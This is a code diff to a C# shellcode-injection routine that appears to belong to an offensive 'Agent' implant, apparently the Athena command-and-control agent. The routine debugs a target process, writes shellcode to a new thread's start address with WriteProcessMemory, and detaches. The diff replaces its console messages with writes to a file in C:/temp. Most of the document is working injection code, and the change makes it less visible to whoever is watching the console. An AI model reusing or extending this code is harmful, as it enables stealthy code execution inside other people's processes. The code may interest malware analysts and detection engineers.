@@ -45,13 +45,14 @@ namespace Agent
                 return false;
             }
 
+            string fileName = @"C:/temp/Athena.txt";
 
 
             IntPtr hProcess = htarger;
             int processId = GetProcessId(hProcess);
             IntPtr hThread = GetThreadId(hProcess);
 
-            Console.WriteLine("[i] Target Process ID: " + processId);
+            File.WriteAllText(fileName,"[i] Target Process ID: " + processId);
 
             DEBUG_EVENT debugEvent;
             IntPtr bytesWritten;
@@ -60,19 +61,19 @@ namespace Agent
             {
                 if (debugEvent.dwDebugEventCode == 2) // CREATE_THREAD_DEBUG_EVENT
                 {
-                    Console.WriteLine("[+] Targeting Thread ID: " + debugEvent.dwThreadId);
+                    File.WriteAllText(fileName, "[+] Targeting Thread ID: " + debugEvent.dwThreadId);
 
                     if (!WriteProcessMemory(hProcess, debugEvent.u.CreateProcessInfo.lpStartAddress, shellcode, shellcode.Length, out bytesWritten) ||
                         bytesWritten.ToInt32() != shellcode.Length)
                     {
-                        Console.WriteLine("[!] - WriteProcessMemory failed with error: " + Marshal.GetLastWin32Error());
-                        Console.WriteLine("[i] -  Wrote " + bytesWritten.ToInt32() + " of " + shellcode.Length + " bytes.");
+                        File.WriteAllText(fileName, "[!] - WriteProcessMemory failed with error: " + Marshal.GetLastWin32Error());
+                        File.WriteAllText(fileName, "[i] -  Wrote " + bytesWritten.ToInt32() + " of " + shellcode.Length + " bytes.");
                         return false;
                     }
 
                     if (!DebugActiveProcessStop(processId))
                     {
-                        Console.WriteLine("[!] - DebugActiveProcessStop failed with error: " + Marshal.GetLastWin32Error());
+                        File.WriteAllText(fileName, "[!] - DebugActiveProcessStop failed with error: " + Marshal.GetLastWin32Error());
                         return false;
                     }
 
@@ -83,7 +84,7 @@ namespace Agent
                 ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, 0x00010002); // DBG_CONTINUE
             }
 
-            Console.WriteLine("[i] Injection complete.");
+            File.WriteAllText(fileName, "[i] Injection complete.");
             CloseHandle(hProcess);
             CloseHandle(hThread);
 
